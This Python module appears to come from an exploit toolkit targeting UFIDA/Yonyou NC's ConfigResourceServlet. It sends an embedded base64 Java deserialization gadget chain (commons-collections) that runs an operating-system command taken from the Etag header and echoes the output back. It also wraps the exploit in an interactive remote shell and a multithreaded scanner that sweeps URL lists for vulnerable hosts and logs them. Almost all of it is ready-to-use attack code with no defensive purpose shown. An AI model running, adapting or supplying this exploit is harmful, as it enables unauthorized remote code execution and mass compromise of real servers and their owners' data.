from concurrent.futures import ThreadPoolExecutor, as_completed
from alive_progress import alive_bar
from prompt_toolkit import HTML, PromptSession
import requests
from typing import List, Optional, Tuple
from rich.console import Console
from requests.packages.urllib3.exceptions import InsecureRequestWarning # type: ignore
from libs.custom_print import custom_print
from prompt_toolkit.history import InMemoryHistory
import base64


vulnerable_name="ufida nc_crs_deserialization"

class ufida_crs:
    def __init__(self, url: Optional[str]=None,Proxy: Optional[str]=None) -> None:
        self.Proxy = Proxy
        self.url: Optional[str] = url
        self.session: requests.Session = requests.Session()
        self.session.proxies = {"http": self.Proxy, "https": self.Proxy}
        self.console: Console = Console()
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        return
    
    def execute_command(self, cmd:str = "whoami", verbose:bool = True) -> str:
        result:str = 0
        try:
            headers={
                'Accept-Encoding': 'gzip',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
                'Etag': cmd
            }
            url = f"{self.url}/servlet/~ic/nc.bs.framework.server.ConfigResourceServlet"
            payload = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQABHN1MThzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAZzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHEAfgADeHB2cgAqb3JnLm1vemlsbGEuamF2YXNjcmlwdC5EZWZpbmluZ0NsYXNzTG9hZGVyAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAABdXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAdAAOZ2V0Q29uc3RydWN0b3J1cQB+ABoAAAABdnEAfgAac3EAfgATdXEAfgAYAAAAAXVxAH4AGAAAAAB0AAtuZXdJbnN0YW5jZXVxAH4AGgAAAAF2cQB+ABhzcQB+ABN1cQB+ABgAAAACdAAlb3JnLmFwYWNoZS5sb2dnaW5nLnV0aWwuY3J5cHQuTm9DcnlwdHVyAAJbQqzzF/gGCFTgAgAAeHAAAA/iyv66vgAAADIA4wEAJW9yZy9hcGFjaGUvbG9nZ2luZy91dGlsL2NyeXB0L05vQ3J5cHQHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQwABQAGCgAEAAkBAAFxAQAzKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQAHZXhlY0NtZAwADQAMCgACAA4BAAg8Y2xpbml0PgEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcAEQEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HABMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwAVAQAVamF2YS9sYW5nL1RocmVhZEdyb3VwBwAXAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwAZAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHABsBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwAdAQAQamF2YS9sYW5nL1RocmVhZAcAHwEAEGphdmEvbGFuZy9TdHJpbmcHACEBAA5qYXZhL3V0aWwvTGlzdAcAIwEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwAlAQANU3RhY2tNYXBUYWJsZQEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAKAApCgAgACoBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsMACwALQoAIAAuAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAMAAxCgAgADIBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsMADQANQoABAA2AQAHdGhyZWFkcwgAOAEAD2phdmEvbGFuZy9DbGFzcwcAOgEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMADwAPQoAOwA+AQANc2V0QWNjZXNzaWJsZQEABChaKVYMAEAAQQoAHABCAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAEQARQoAHABGAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DABIAEkKACAASgEABGV4ZWMIAEwBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwATgBPCgAiAFABAARodHRwCABSAQAGdGFyZ2V0CABUAQASamF2YS9sYW5nL1J1bm5hYmxlBwBWAQAGdGhpcyQwCABYAQAHaGFuZGxlcggAWgEADWdldFN1cGVyY2xhc3MMAFwANQoAOwBdAQAGZ2xvYmFsCABfAQAKcHJvY2Vzc29ycwgAYQEABHNpemUBAAMoKUkMAGMAZAsAJABlAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABEAGcLACQAaAEAA3JlcQgAagEAC2dldFJlc3BvbnNlCABsAQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwAbgBvCgA7AHABABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHAHIBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAHQAdQoAcwB2AQAJZ2V0SGVhZGVyCAB4AQAKQ01EX0hFQURFUgEAEkxqYXZhL2xhbmcvU3RyaW5nOwwAegB7CQACAHwBAAdpc0VtcHR5AQADKClaDAB+AH8KACIAgAEACXNldFN0YXR1cwgAggEAEWphdmEvbGFuZy9JbnRlZ2VyBwCEAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7DACGAIcJAIUAiAEABChJKVYMAAUAigoAhQCLDAALAAwKAAIAjQEAJG9yZy5hcGFjaGUudG9tY2F0LnV0aWwuYnVmLkJ5dGVDaHVuawgAjwEAB2Zvck5hbWUBAD0oTGphdmEvbGFuZy9TdHJpbmc7WkxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KUxqYXZhL2xhbmcvQ2xhc3M7DACRAJIKADsAkwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsMAJUAlgoAOwCXAQAIc2V0Qnl0ZXMIAJkBAAJbQgcAmwEAEWdldERlY2xhcmVkTWV0aG9kDACdAG8KADsAngEAC3RvQnl0ZUFycmF5AQAEKClbQgwAoAChCgAmAKIBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwwApAClCgCFAKYBAAdkb1dyaXRlCACoAQATamF2YS5uaW8uQnl0ZUJ1ZmZlcggAqgEABHdyYXAIAKwBABNbTGphdmEvbGFuZy9TdHJpbmc7BwCuAQATamF2YS9pby9JbnB1dFN0cmVhbQcAsAEAB29zLm5hbWUIALIBABBqYXZhL2xhbmcvU3lzdGVtBwC0AQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwwAtgC3CgC1ALgBAAt0b0xvd2VyQ2FzZQwAugBJCgAiALsBAAN3aW4IAL0BAANjbWQIAL8BAAIvYwgAwQEACS9iaW4vYmFzaAgAwwEAAi1jCADFAQARamF2YS9sYW5nL1J1bnRpbWUHAMcBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DADJAMoKAMgAywEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMAEwAzQoAyADOAQARamF2YS9sYW5nL1Byb2Nlc3MHANABAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07DADSANMKANEA1AoAJgAJAQAFd3JpdGUBAAcoW0JJSSlWDADXANgKACYA2QEABHJlYWQBAAUoW0IpSQwA2wDcCgCxAN0BAApTb3VyY2VGaWxlAQAPVG9tY2F0RWNoby5qYXZhAQAERXRhZwgA4QAhAAIABAAAAAEACQB6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"
            data = base64.b64decode(payload)
            response = self.session.post(url=url, data=data, headers=headers, timeout=100)
            result=response.text.split('<html>',1)[0]
            if verbose:
                custom_print(
                    "Command executed successfully."
                    if result
                    else "Failed to execute command.",
                    "+" if result else "-",
                )
        except requests.exceptions.Timeout:
            if verbose:
                custom_print("Request timed out.", "-")
        except requests.exceptions.RequestException as e:
            if verbose:
                custom_print(f"Request failed: {e}", "-")
        except AttributeError as e:
            if verbose:
                custom_print(f"No results recieved. {e}", "*")
        except Exception as e:
            if verbose:
                custom_print(f"Critical error!", "!")
        return result

    def check_single_url(self, url:Optional[str]) -> Tuple[str, bool]:
        self.url = url
        result: str = self.execute_command(verbose=False)
        is_vulnerable: bool = bool(result)
        if is_vulnerable == False:
            custom_print(f"{self.url} is not vulnerabled.", "-")
        elif is_vulnerable == True:
            custom_print(f"{self.url} is vulnerabled.", "+")
        else:
            custom_print("Unkown Error.", "!")
            exit()
        return f"{self.url} is vulnerable to {vulnerable_name}: {result}", is_vulnerable


    def interactive_shell(self) -> None:
        initial_result = self.execute_command()
        if initial_result:
            custom_print(
                f"{self.url} is vulnerable to {vulnerable_name}: {initial_result}", "!"
            )
            custom_print("Opening interactive shell...", "+")
            session: PromptSession = PromptSession(history=InMemoryHistory())
            while 1:
                try:
                    cmd: str = session.prompt(
                        HTML("<ansiyellow><b>$ </b></ansiyellow>"), default=""
                    ).strip()
                    if cmd.lower() == "exit":
                        break
                    elif cmd.lower() == "clear":
                        self.console.clear()
                        continue
                    output: str = self.execute_command(cmd)
                    if output:
                        print(f"{output}\n")
                except KeyboardInterrupt:
                    print("Exiting interactive shell...", "!")
                    break
        else:
            custom_print("System is not vulnerable or check failed.", "-")


    def check_urls_and_write_output(
            self, urls: List[str], output_path: Optional[str], max_workers: int = 20
    ) -> None:
        with ThreadPoolExecutor(max_workers=max_workers) as executor, alive_bar(
                len(urls), enrich_print=False
        ) as bar:
            futures = {executor.submit(self.check_single_url, url): url for url in urls}
            for future in as_completed(futures):
                result, is_vulnerable = future.result()
                if is_vulnerable:
                    custom_print(result, "+")
                    if output_path:
                        with open(output_path, "a") as file:
                            file.write(result)
                bar()


